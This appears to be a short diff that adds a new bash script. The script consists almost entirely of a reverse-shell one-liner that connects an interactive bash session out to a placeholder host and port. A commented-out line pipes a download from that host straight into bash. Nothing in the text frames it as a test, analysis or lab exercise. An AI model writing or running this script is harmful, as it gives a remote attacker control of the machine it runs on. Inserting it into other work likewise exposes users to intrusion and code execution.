@@ -1,0 +1,6 @@
+#!/bin/bash
+
+
+bash -i >& /dev/tcp/x89p_ip_here/x89p_ip_here 0>&1
+
+#   curl x89p_ip | bash
